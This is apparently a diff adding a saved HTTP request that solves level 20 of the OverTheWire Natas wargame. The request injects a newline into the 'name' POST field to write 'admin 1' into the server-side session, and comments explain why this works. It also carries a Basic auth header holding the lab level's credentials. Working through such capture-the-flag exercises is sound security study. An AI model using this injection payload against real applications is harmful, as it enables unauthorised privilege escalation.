@@ -1,0 +1,24 @@
+POST /index.php?debug=1 HTTP/1.1
+Host: natas20.natas.labs.overthewire.org
+Content-Length: 18
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==
+Origin: http://natas20.natas.labs.overthewire.org
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://natas20.natas.labs.overthewire.org/index.php?debug=1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=i6244tc1hk88rfb8pd67k4tcf3
+sec-gpc: 1
+Connection: close
+
+name=test
+admin 1
+
+// The page parses the session variables line by line as "{variable_name} {variable_value}"
+// We control the name POST parameter, and can send a newline and write in that we're admin
+// Send this then refresh the page.
